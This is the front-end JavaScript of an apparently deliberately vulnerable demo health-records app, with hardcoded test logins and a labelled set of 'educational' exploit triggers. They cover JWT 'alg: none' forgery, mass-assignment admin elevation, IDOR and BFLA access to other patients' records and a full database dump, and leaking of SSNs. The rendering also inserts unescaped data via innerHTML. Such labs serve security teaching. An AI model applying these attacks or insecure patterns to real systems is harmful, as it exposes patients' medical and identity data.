const API_BASE = '/api/v1';

// Preset credentials for easy testing
const USERS = {
  alice: { email: 'alice.smith@example.com', pass: 'PatientPass123!', label: 'Alice Smith (Patient #4)', role: 'Patient', patientId: 4 },
  bob: { email: 'bob.jones@example.com', pass: 'PatientPass123!', label: 'Bob Jones (Patient #5)', role: 'Patient', patientId: 5 },
  doctor: { email: 'dr.house@medisecure.health', pass: 'DoctorPass123!', label: 'Dr. Gregory House (Doctor #2)', role: 'Doctor', patientId: 4 },
  admin: { email: 'admin@medisecure.health', pass: 'AdminPass2026!', label: 'System Admin (Admin #1)', role: 'Admin', patientId: 4 }
};

let currentPersona = 'alice';
let currentToken = '';
let currentTab = 'records';

// Initialize
window.addEventListener('DOMContentLoaded', async () => {
  await switchUser('alice');
});

// Helper to inspect API traffic
function displayResponse(status, data) {
  const statusEl = document.getElementById('responseStatus');
  const box = document.getElementById('apiResponseBox');
  statusEl.textContent = `HTTP ${status}`;
  statusEl.style.color = status >= 200 && status < 300 ? 'var(--accent-green)' : 'var(--accent-red)';
  box.textContent = JSON.stringify(data, null, 2);
}

// Switch user persona
async function switchUser(personaKey) {
  currentPersona = personaKey;
  const user = USERS[personaKey];
  
  // Highlight active pill
  document.querySelectorAll('.pill-btn').forEach(btn => btn.classList.remove('active'));
  event?.target?.classList.add('active');

  try {
    const res = await fetch(`${API_BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: user.email, password: user.pass })
    });
    const data = await res.json();
    currentToken = data.token;

    document.getElementById('currentUserLabel').textContent = `${data.fullName} (${data.role} #${data.userId})`;
    const roleBadge = document.getElementById('roleBadge');
    roleBadge.textContent = data.role + (data.isAdmin ? ' (Elevated)' : '');
    roleBadge.className = `data-badge badge-${data.role.toLowerCase()}`;

    displayResponse(res.status, { loginResult: data });
    await refreshCurrentTab();
  } catch (err) {
    displayResponse(500, { error: err.message });
  }
}

// Set active navigation tab
function setTab(tabName) {
  currentTab = tabName;
  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
  event?.target?.classList.add('active');

  document.getElementById('recordsView').style.display = tabName === 'records' ? 'flex' : 'none';
  document.getElementById('appointmentsView').style.display = tabName === 'appointments' ? 'flex' : 'none';
  document.getElementById('labsView').style.display = tabName === 'labs' ? 'flex' : 'none';
  document.getElementById('profileView').style.display = tabName === 'profile' ? 'flex' : 'none';

  refreshCurrentTab();
}

async function refreshCurrentTab() {
  if (currentTab === 'records') await loadRecords();
  else if (currentTab === 'appointments') await loadAppointments();
  else if (currentTab === 'labs') await loadLabs();
  else if (currentTab === 'profile') await loadProfile();
}

// Load Medical Records
async function loadRecords() {
  const container = document.getElementById('recordsView');
  container.innerHTML = '<div class="data-item">Loading records...</div>';

  try {
    const res = await fetch(`${API_BASE}/records`, {
      headers: { 'Authorization': `Bearer ${currentToken}` }
    });
    const records = await res.json();
    displayResponse(res.status, records);

    if (!Array.isArray(records) || records.length === 0) {
      container.innerHTML = '<div class="data-item">No records found.</div>';
      return;
    }

    container.innerHTML = records.map(r => `
      <div class="data-item">
        <div class="data-header">
          <strong>🏥 Diagnosis: ${r.diagnosis}</strong>
          <span class="data-badge badge-doctor">${r.doctorName}</span>
        </div>
        <div style="font-size: 13px; color: var(--accent-cyan);">
          💊 <strong>Prescription:</strong> ${r.prescription} (${r.dosage})
        </div>
        <div style="font-size: 12px; color: var(--text-muted);">
          👤 Patient: <strong>${r.patientName} (ID: ${r.patientId})</strong> | Date: ${new Date(r.recordDate).toLocaleDateString()}
        </div>
        <div style="font-size: 12px; margin-top: 4px; color: #cbd5e1;">
          📝 <em>"${r.clinicalNotes}"</em>
        </div>
      </div>
    `).join('');
  } catch (err) {
    container.innerHTML = `<div class="data-item" style="color: var(--accent-red);">Error loading records: ${err.message}</div>`;
  }
}

// Load Appointments
async function loadAppointments() {
  const container = document.getElementById('appointmentsView');
  container.innerHTML = '<div class="data-item">Loading appointments...</div>';

  try {
    const res = await fetch(`${API_BASE}/appointments`, {
      headers: { 'Authorization': `Bearer ${currentToken}` }
    });
    const appts = await res.json();
    displayResponse(res.status, appts);

    container.innerHTML = appts.map(a => `
      <div class="data-item">
        <div class="data-header">
          <strong>📅 ${a.reason}</strong>
          <span class="data-badge badge-patient">${a.status}</span>
        </div>
        <div style="font-size: 12px; color: var(--text-muted);">
          Patient: ${a.patientName} | Provider: ${a.doctorName} | Fee: <strong>$${a.fee.toFixed(2)}</strong>
        </div>
        <div style="font-size: 12px; color: var(--accent-blue);">
          Type: ${a.consultationType} | Scheduled: ${new Date(a.appointmentDate).toLocaleString()}
        </div>
      </div>
    `).join('');
  } catch (err) {
    container.innerHTML = `<div class="data-item" style="color: var(--accent-red);">Error loading appointments: ${err.message}</div>`;
  }
}

// Load Lab Results
async function loadLabs() {
  const container = document.getElementById('labsView');
  container.innerHTML = '<div class="data-item">Loading lab results...</div>';

  try {
    const res = await fetch(`${API_BASE}/labs/results/4`, {
      headers: { 'Authorization': `Bearer ${currentToken}` }
    });
    const labs = await res.json();
    displayResponse(res.status, labs);

    container.innerHTML = labs.map(l => `
      <div class="data-item">
        <div class="data-header">
          <strong>🧪 ${l.testName}</strong>
          <span class="data-badge badge-doctor">${l.uploadedBy}</span>
        </div>
        <div style="font-size: 12px; color: #cbd5e1;">${l.resultSummary}</div>
        <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">File: <code>${l.originalFileName}</code></div>
      </div>
    `).join('');
  } catch (err) {
    container.innerHTML = `<div class="data-item" style="color: var(--accent-red);">Error loading labs: ${err.message}</div>`;
  }
}

// Load Profile
async function loadProfile() {
  const container = document.getElementById('profileView');
  try {
    const res = await fetch(`${API_BASE}/users/profile`, {
      headers: { 'Authorization': `Bearer ${currentToken}` }
    });
    const user = await res.json();
    displayResponse(res.status, user);

    container.innerHTML = `
      <div class="data-item">
        <div class="data-header">
          <strong>👤 ${user.fullName}</strong>
          <span class="data-badge badge-${user.role.toLowerCase()}">${user.role}</span>
        </div>
        <div style="font-size: 12px;">📧 Email: ${user.email}</div>
        <div style="font-size: 12px; color: var(--accent-red);">🆔 SSN / National ID (PII): <strong>${user.nationalIdOrSSN}</strong></div>
        <div style="font-size: 12px;">📱 Phone: ${user.phoneNumber}</div>
        <div style="font-size: 12px;">🏠 Address: ${user.address}</div>
        <div style="font-size: 12px; color: ${user.isAdmin ? 'var(--accent-amber)' : 'var(--text-muted)'};">
          🛡️ Admin Status: <strong>${user.isAdmin ? 'Yes (Administrator)' : 'No (Standard User)'}</strong>
        </div>
      </div>
    `;
  } catch (err) {
    container.innerHTML = `<div class="data-item" style="color: var(--accent-red);">Error loading profile: ${err.message}</div>`;
  }
}

// ==========================================
// STRIDE EXPLOIT TRIGGERS (EDUCATIONAL DEMOS)
// ==========================================

// TH-01: Spoofing with algorithm: none
async function triggerSpoofingExploit() {
  const res = await fetch(`${API_BASE}/auth/forge-token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ userId: 1, email: 'admin@medisecure.health', role: 'Admin', useNoneAlgorithm: true })
  });
  const data = await res.json();
  currentToken = data.forgedToken;

  // Use forged token against admin endpoint
  const adminRes = await fetch(`${API_BASE}/users/diagnostics?debug=true`, {
    headers: { 'Authorization': `Bearer ${currentToken}` }
  });
  const adminData = await adminRes.json();

  displayResponse(adminRes.status, {
    exploit: 'TH-01: JWT Spoofing with alg: none',
    forgedTokenPayload: data,
    diagnosticsExfiltratedWithForgedToken: adminData
  });
}

// TH-02: Mass Assignment (Elevate Role to Admin)
async function triggerMassAssignmentExploit() {
  const res = await fetch(`${API_BASE}/users/profile`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${currentToken}`
    },
    body: JSON.stringify({
      Role: 'Admin',
      IsAdmin: true
    })
  });
  const data = await res.json();
  displayResponse(res.status, {
    exploit: 'TH-02: Mass Assignment Privilege Elevation',
    serverResult: data
  });
  await refreshCurrentTab();
}

// TH-05: IDOR / Cross Patient Data Exfiltration
async function triggerIdorExploit() {
  // As current user, fetch records of Bob (#5) and Charlie (#6)
  const resBob = await fetch(`${API_BASE}/records/patient/5`, {
    headers: { 'Authorization': `Bearer ${currentToken}` }
  });
  const dataBob = await resBob.json();

  const resCharlie = await fetch(`${API_BASE}/records/patient/6`, {
    headers: { 'Authorization': `Bearer ${currentToken}` }
  });
  const dataCharlie = await resCharlie.json();

  displayResponse(200, {
    exploit: 'TH-05: Broken Object Level Authorization (IDOR / BOLA)',
    crossPatientAccess: {
      bobRecordsLeaked: dataBob,
      charlieRecordsLeaked: dataCharlie
    }
  });
}

// TH-08: BFLA / Dump Entire Hospital Database
async function triggerBflaExploit() {
  const res = await fetch(`${API_BASE}/admin/export-database`, {
    headers: { 'Authorization': `Bearer ${currentToken}` }
  });
  const data = await res.json();
  displayResponse(res.status, {
    exploit: 'TH-08: Broken Function Level Authorization (BFLA)',
    exfiltratedEhrDump: data
  });
}

// TH-06: Excessive Data Exposure (Leak all SSNs & Hashes)
async function triggerExcessiveDataExploit() {
  const res = await fetch(`${API_BASE}/users`, {
    headers: { 'Authorization': `Bearer ${currentToken}` }
  });
  const data = await res.json();
  displayResponse(res.status, {
    exploit: 'TH-06: Excessive Data Exposure (OWASP API3 / CWE-213)',
    exposedUsersInventory: data
  });
}
